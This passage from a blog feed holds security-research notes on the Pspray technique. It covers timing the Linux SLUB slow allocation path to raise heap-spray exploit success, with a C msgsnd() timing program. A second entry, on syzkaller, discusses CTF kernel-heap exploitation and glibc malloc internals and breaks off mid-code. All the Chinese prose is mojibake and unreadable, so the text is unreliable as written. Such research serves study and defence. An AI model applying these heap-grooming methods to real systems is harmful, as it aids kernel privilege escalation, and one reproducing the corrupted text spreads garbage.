Random</code>æœºåˆ¶ï¼Œå½“å¼€å¯<code>CONFIG_SLAB_FREELIST_RANDOM</code>é€‰é¡¹æ—¶ä¼šå¼€å¯ä¿æŠ¤ï¼Œä¸»è¦å½¢å¼å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123155055348.png"                      alt="image-20231123155055348"                ></p><h3 id="Out-Of-Bounds"><a href="#Out-Of-Bounds" class="headerlink" title="Out Of Bounds"></a>Out Of Bounds</h3><p>åœ¨å †åˆ©ç”¨ä¸­æ—¶å¸¸ä¼šé‡åˆ°å †æº¢å‡ºçš„æ¼æ´ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬éƒ½æœŸæœ›èƒ½å¤Ÿå®ç°ä¸‹å›¾è¿™æ ·å †çš„å½¢å¼</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123155332029.png"                      alt="image-20231123155332029"                ></p><p>ä½†æ˜¯äº‹ä¸æ„¿è¿ï¼Œå› ä¸ºåœ°å€éšæœºåŒ–çš„å­˜åœ¨å¤§æ¦‚ç‡ä¼šæˆä¸ºä¸‹å›¾è¿™æ ·</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123155423929.png"                      alt="image-20231123155423929"                ></p><p>ä¸­é—´å¯èƒ½éš”ç€å…¶ä»–ç»“æ„ä½“ï¼Œä¸€ç±»çš„æƒ…å†µã€‚</p><p>åœ¨å¼€å¯ freelist éšæœºåŒ–ä¹‹åçš„æ¼æ´åˆ©ç”¨æˆåŠŸç‡å¦‚ä¸‹ï¼ŒåŸºäº Linux kernel ä½¿ç”¨ <code>Fisher-Yates shuffle</code> ç®—æ³•æ¥è¿›è¡ŒéšæœºåŒ–è¿™ä¸ªå‰æè®¡ç®—çš„ï¼Œå…¶ä¸­Nä¸ºä¸€å¼  slub ä¸Šçš„æ€»å¯¹è±¡æ•°ï¼ŒåŒæ—¶æˆ‘ä»¬å‡è®¾åœ¨åŒä¸€å¼  slab ä¸Šåˆ†é…äº† 1 ä¸ªæ¼æ´å¯¹è±¡ä¸kä¸ª victim å¯¹è±¡ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123155859344.png"                      alt="image-20231123155859344"                ></p><p>ï¼ˆä¸ä¼šå†™æ•°å­¦å…¬å¼ï¼‰</p><p>æ€»ä½“è€Œè¨€ï¼Œæˆ‘ä»¬ä»Nä¸ªç©ºé—²å¯¹è±¡ä¸­é€‰æ‹©kä¸ª victim å¯¹è±¡ ä¸ 1 ä¸ªæ¼æ´å¯¹è±¡ï¼Œåœ¨è¿›è¡Œåˆ©ç”¨æ—¶ victim å¯¹è±¡ä¸æ¼æ´å¯¹è±¡å¿…é¡»ç›¸é‚»ï¼Œå› æ­¤æˆ‘ä»¬ä»Nâˆ’1 ä¸ªå¯¹è±¡ä¸­å–å‡ºkä¸ªå¯¹è±¡ï¼ˆè¿˜æœ‰ä¸€ä¸ªä½œä¸ºæ¼æ´å¯¹è±¡ï¼‰ï¼Œå–·å°„çš„ victim å¯¹è±¡æ•°é‡å¯ä»¥ä» 0 åˆ° Nâˆ’1 ï¼Œå› æ­¤å¯¹äºå¸¦æœ‰ random slab freelist çš„ OOB åˆ©ç”¨è€Œè¨€çš„æˆåŠŸç‡è®¡ç®—å¦‚ä¸‹ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123160048017.png"                      alt="image-20231123160048017"                ></p><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123160326552.png"                      alt="image-20231123160326552"                ></p><p>UAF æ¼æ´çš„åˆ©ç”¨é€šå¸¸æ˜¯è¦å°†æ¼æ´å¯¹è±¡ä¸ victim å¯¹è±¡æ”¾åœ¨åŒä¸€å†…å­˜åœ°å€ï¼Œä¸Šå›¾å±•ç¤ºäº†å¯¹ CVE-2019-2215 çš„åˆ©ç”¨è¿‡ç¨‹ï¼Œé¦–å…ˆç”¨ <code>epoll_ctl()</code> åˆ†é…æ¼æ´å¯¹è±¡ï¼Œæ¥ä¸‹æ¥ç”¨ <code>ioctl()</code> é‡Šæ”¾æ¼æ´å¯¹è±¡ï¼Œéšåç”¨ <code>msgsnd()</code> å–å›åˆšåˆšé‡Šæ”¾çš„å¯¹è±¡ï¼Œæœ€åå†ç”¨ <code>close()</code> å°†è¯¥å¯¹è±¡é‡Šæ”¾</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123160510337.png"                      alt="image-20231123160510337"                ></p><p>ä¸Šå›¾ä¸»è¦å±•ç¤ºäº†UAFçš„å¤±è´¥æ¡ˆä¾‹ï¼ŒUAFçš„æˆåŠŸç‡å¦‚ä¸‹</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123160657856.png"                      alt="image-20231123160657856"                ></p><p>ä¸Šå¼ä¸­Aè¡¨ç¤ºçš„åˆ†é…çš„å¯¹è±¡æ•°é‡ï¼ŒNè¡¨ç¤ºä¸€å¼ slabæ‹¥æœ‰çš„å¯¹è±¡æ•°é‡ã€‚æ¼æ´åˆ©ç”¨å¤±è´¥çš„ä¸»è¦åŸå› æ˜¯å¯¹ slab ä¿¡æ¯çš„ç¼ºå¤±ï¼Œæœ¬æ–‡æ‰¾åˆ°äº†ä¸€ç§èƒ½å¤Ÿè·å– slab çš„éƒ¨åˆ†åˆ†é…ä¿¡æ¯çš„æ—¶åºä¾§ä¿¡é“æ–¹æ³•ï¼Œä»è€Œæé«˜åˆ©ç”¨æˆåŠŸæ¦‚ç‡ã€‚</p><h2 id="åˆ©ç”¨åŸç†åˆ†æ"><a href="#åˆ©ç”¨åŸç†åˆ†æ" class="headerlink" title="åˆ©ç”¨åŸç†åˆ†æ"></a>åˆ©ç”¨åŸç†åˆ†æ</h2><p>å¦‚å‰é¢çš„ä¸€å¼ å›¾æ‰€ç¤ºï¼ŒSLUB æœ‰äº”æ¡ä¸åŒæ·±åº¦çš„åˆ†é…è·¯å¾„ä»¥ä¼˜åŒ–æ€§èƒ½è¡¨ç°ï¼Œä¸ºäº†å¼„æ¸…ä¸åŒè·¯å¾„çš„è¡¨ç°ï¼Œä½œè€…é€šè¿‡ <code>msgsnd()</code> ç³»ç»Ÿè°ƒç”¨æµ‹è¯•äº†ä» <code>kmalloc()</code> çš„æ ¸å¿ƒå‡½æ•° <code>slab_alloc_node()</code> çš„å¼€å§‹åˆ°ç»“å°¾çš„æ€§èƒ½ï¼Œç»è¿‡å¤šè½®æµ‹è¯•å‘ç° <code>slow-path</code> ä¸å…¶ä»–è·¯å¾„ç›¸æ¯”å­˜åœ¨æ˜æ˜¾çš„è¡¨ç°å·®è·ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡æµ‹é‡åˆ†é…æ—¶é—´å¾—çŸ¥å†…å­˜åˆ†é…æ‰€ç»å†çš„è·¯å¾„ã€‚</p><p><code>slow-path</code> ä»¥å¤–çš„åˆ†é…è·¯å¾„çš„åˆ†é…çŠ¶æ€éƒ½æ˜¯éš¾ä»¥ç¡®å®šçš„ï¼Œä½† <code>slow-path</code> çš„è¡Œä¸ºä¸å…¶ä»–è·¯å¾„ä¸åŒï¼Œæ­¤æ—¶å†…æ ¸ä¼šä»<code>buddy system</code>åˆ†é…ä¸€å¼ æ–° slabï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“å½“å‰çš„ slab åˆšè¢«åˆ†é…ä¸”ä»…åˆ†é…äº†ä¸€ä¸ªå¯¹è±¡</p><p>ä¸ºäº†èƒ½å¤Ÿä½¿ç”¨æ—¶åºä¾§ä¿¡é“æ”»å‡»ï¼Œéœ€è¦æ‰¾åˆ°æ»¡è¶³è¿™æ ·ä¸‰ä¸ªæ¡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé¦–å…ˆæ˜¯æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨ï¼Œå…¶æ¬¡åªåˆ†é…ä¸€ä¸ªå¯¹è±¡ï¼Œæœ€åé™¤äº†åˆ†é…å¯¹è±¡å¤–æ€§èƒ½å¼€é”€è¾ƒå°ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123162356541.png"                      alt="image-20231123162356541"                ></p><p>è¿™é‡ŒåŸä½œè€…æ‰¾åˆ°äº†æ»¡è¶³ä¸Šé¢ä¸‰ä¸ªæ¡ä»¶å¹¶ä¸”ä»æ¶µç›–<code>kmalloc-32</code>åˆ°<code>kmalloc-8192</code>çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123162555768.png"                      alt="image-20231123162555768"                ></p><p>è¿™é‡Œä½¿ç”¨<code>msgsnd</code>ç³»ç»Ÿè°ƒç”¨æµ‹è¯•å¾—åˆ°äº†å¦‚ä¸Šå›¾æ‰€ç¤ºçš„ç»“æœï¼Œå¯ä»¥çŸ¥é“çš„äº‹<code>fast path</code>å’Œ<code>medium path</code>ä¸€èˆ¬æ¥è¯´è¾ƒä¸ºéš¾ä»¥åŒºåˆ†ï¼Œä½†æ˜¯åœ¨<code>slow path</code>æ—¶ä¼šæœ‰å¾ˆæ˜æ˜¾çš„æ—¶é—´å·®ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123162822451.png"                      alt="image-20231123162822451"                ></p><p>ä¸Šå›¾å±•ç¤ºäº†åˆ©ç”¨<code>Pspray</code>çš„æµç¨‹ï¼š</p><ol><li>  é¦–å…ˆä½¿ç”¨<code>Pspray</code>ç¡®å®šäº†<code>slow path</code>è¢«æ‰§è¡Œï¼Œæ­¤æ—¶æ„å‘³ç€å½“å‰çš„<code>cpu slab</code>æ˜¯æ–°å‘<code>buddy system</code>ç”³è¯·çš„slab</li><li>  æ¥ä¸‹æ¥å †å–·N-1ä¸ªå¯¹è±¡ä½¿å…¶å®Œå…¨è¢«åˆ†é…</li><li>  æ­¤æ—¶å¦‚æœå†æ¬¡ç”³è¯·ä¸€ä¸ªå¯¹è±¡åˆ™åˆå›è¿›å…¥åˆ°<code>slow path</code>ä¸­ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªå…¨éƒ¨ä¸ºç©ºçš„slab</li><li>  ä¸éš¾æƒ³åˆ°çš„æ˜¯å¦‚æœæˆ‘ä»¬çš„<code>Vuln object</code>ä¸åœ¨é«˜åœ°å€é‚£ä¹ˆå°±ä¸€å®šå¯ä»¥å®Œæˆæ¼æ´åˆ©ç”¨</li></ol><p>æ­¤æ—¶åˆ©ç”¨çš„æˆåŠŸç‡ä¸º</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123163220066.png"                      alt="image-20231123163220066"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123163250150.png"                      alt="image-20231123163250150"                ></p><p>åé¢çš„UAFçš„æµç¨‹å’Œä¸Šè¿°ç±»ä¼¼ï¼Œå¹¶ä¸”å…¶æˆåŠŸç‡ä¸º</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123163335334.png"                      alt="image-20231123163335334"                ></p><h3 id="å®é™…æµ‹è¯•"><a href="#å®é™…æµ‹è¯•" class="headerlink" title="å®é™…æµ‹è¯•"></a>å®é™…æµ‹è¯•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">    <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_cpu</span><span class="params">(<span class="keyword">int</span> core)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">rdtsc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;rdtsc;&quot;</span></span><br><span class="line">        <span class="string">&quot;shl rdx,32;&quot;</span></span><br><span class="line">        <span class="string">&quot;add rax,rdx;&quot;</span></span><br><span class="line">        <span class="string">&quot;leave;&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msqid[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> exec_time[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msqid_ds</span> <span class="title">ds_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    bind_cpu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to get msg_queue&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = <span class="number">123456</span>;</span><br><span class="line">    ((struct msgbuf *)buf)-&gt;mtype = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> begin, end;</span><br><span class="line"></span><br><span class="line">        begin = rdtsc();</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;buf, <span class="number">512</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to alloc msg_msg&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        end = rdtsc();</span><br><span class="line"></span><br><span class="line">        exec_time[i] = end - begin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], buf, <span class="number">512</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0xdeadbeef</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to free msg_msg&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, &amp;ds_buf) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);</span><br><span class="line">            perror(<span class="string">&quot;FAILED to free msg_queue&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ctfé¢˜ç›®è¿›è¡Œäº†æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯å­˜åœ¨éå¸¸æ˜æ˜¾çš„æ—¶é—´å·®çš„ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123165208062.png"                      alt="image-20231123165208062"                ></p><p>æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹æ³•è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæƒ³å¿…çœ‹å®Œäº†å¤§å®¶ä¹Ÿåº”è¯¥éƒ½æ˜ç™½äº†å¦‚ä½•åˆ©ç”¨æ­¤æ‰‹æ³•ã€‚</p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2023/09/16/PAPER-0X03-PSPRAY/" >https://arttnba3.cn/2023/09/16/PAPER-0X03-PSPRAY/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.usenix.org/system/files/usenixsecurity23-lee-yoochan.pdf" >https://www.usenix.org/system/files/usenixsecurity23-lee-yoochan.pdf<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿‘æœŸåœ¨å·¥ä½œä¸Šé‡åˆ°çš„å†…æ ¸å¾ˆå°‘ï¼Œä»¥è‡³äºæˆ‘éƒ½å¿«å¿˜è®°äº†æˆ‘æ˜¯ç©å†…æ ¸çš„äº†ã€‚è¿™ç¯‡æ–‡ç« éœ€è¦ä¸€ç‚¹&lt;code&gt;slub allocator&lt;/code&gt;çš„åŸºç¡€ï¼Œ</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="å †å–·å°„" scheme="https://196082.github.io/tags/%E5%A0%86%E5%96%B7%E5%B0%84/"/>
    
    <category term="ä¾§ä¿¡é“æ”»å‡»" scheme="https://196082.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
    <category term="slabæºç åˆ†æ" scheme="https://196082.github.io/tags/slab%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller: syz-manageræºç åˆ†æ</title>
    <link href="https://196082.github.io/2023/11/17/syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/"/>
    <id>https://196082.github.io/2023/11/17/syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/</id>
    <published>2023-11-17T03:40:06.000Z</published>
    <updated>2023-11-17T03:40:55.615Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡æ–‡ç« çš„å‰è¨€ä¸»è¦æä¸€ä¸‹å‰æ®µæ—¶é—´åœ¨å¼ºç½‘æ‹Ÿæ€ä¸­çš„pwnï¼Œé¦–å…ˆæ˜¯å†…æ ¸pwnã€‚</p><p>å…¶å®å¾ˆç®€å•å°±æ˜¯ä¸€ä¸ªç®€å•ç‰ˆçš„<code>off by null</code>ã€‚ä½†æ˜¯æˆ‘çŠ¯è ¢äº†ï¼Œåœ¨å †å–·<code>pipe_buffer</code>æ—¶è®¡ç®—é”™è¯¯å¯¼è‡´å †å–·å¤±è´¥ä»¥è‡³äºåœ¨å¼€å§‹æ”¾å¼ƒäº†ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œè½¬è€Œä½¿ç”¨<code>msg_msg</code>å½¢æˆåŒå‘é“¾è¡¨é€ æˆUAFï¼Œå¯æƒœçš„æ˜¯æ­¤æ–¹æ³•å› ä¸º<code>off by null</code>çš„é™åˆ¶ä½¿å¾—å…¶ç”³è¯·çš„å †å—åº”è¯¥æ˜¯ä»<code>kmalloc-192</code>æˆ–ä»¥ä¸‹ç”³è¯·ï¼Œæ‰€ä»¥å¾ˆå¤šå¯ä»¥å †å–·æ¥å†™å…¥çš„ç»“æ„ä½“æ— æ³•ä½¿ç”¨ï¼Œå¦‚æœç»§ç»­ä½¿ç”¨<code>msg_msgseg</code>ç»“æ„ä½“æ¥å®ç°ä»»æ„å†™ä¹Ÿä¼šå› ä¸ºå…¶å­˜åœ¨ä¸€ä¸ª<code>next</code>æŒ‡é’ˆå¯¼è‡´æ— æ³•<code>free</code>ã€‚æœ€åè¿™é“é¢˜ä¾æ—§æ˜¯é€šè¿‡æ„é€ å¤šçº§ç®¡é“è§£å‡ºã€‚</p><p>è¿™é‡Œé‡ç‚¹æä¸€ä¸‹é‚£ä¸€é“å †é¢˜ï¼ˆåšå®Œå†…æ ¸å‡Œæ™¨å››ç‚¹äº†ï¼Œè¿™é“é¢˜æ²¡åšï¼‰ã€‚ç®€å•æè¿°ä¸€ä¸‹æ¼æ´ï¼Œé¦–å…ˆå…¶<code>edit</code>å‡½æ•°ä¸­å­˜åœ¨<code>off by null</code>ï¼Œç„¶åè¿˜å¯ä»¥åœ¨<code>create</code>å‡½æ•°ä¸­ä¸€ç›´ç”³è¯·å †å—ï¼Œä¸è¿‡è¿™é‡Œé™åˆ¶å¤§å°ä¸º 0~0x78 ï¼Œæ‰€æœ‰çš„å †å—èŒƒå›´éƒ½åœ¨<code>fastbin</code>å†…ã€‚ç„¶åä¼°æ‘¸ç€è¿™é¢˜çš„åˆ©ç”¨æ–¹æ³•åº”è¯¥å’Œ<code>top chunk</code>æœ‰å…³ï¼Œä½†æ˜¯ä»”ç»†çœ‹äº†ä¸€ä¸‹<code>house of force</code>å‘ç°æ¡ä»¶å¹¶ä¸æ»¡è¶³ï¼Œåœ¨æ¯”èµ›å¿«ç»“æŸæ—¶çœ‹äº†ä¸€ä¸‹æºç å‘ç°äº†ä»¥å¾€ä¸çŸ¥é“çš„æœºåˆ¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line"></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span 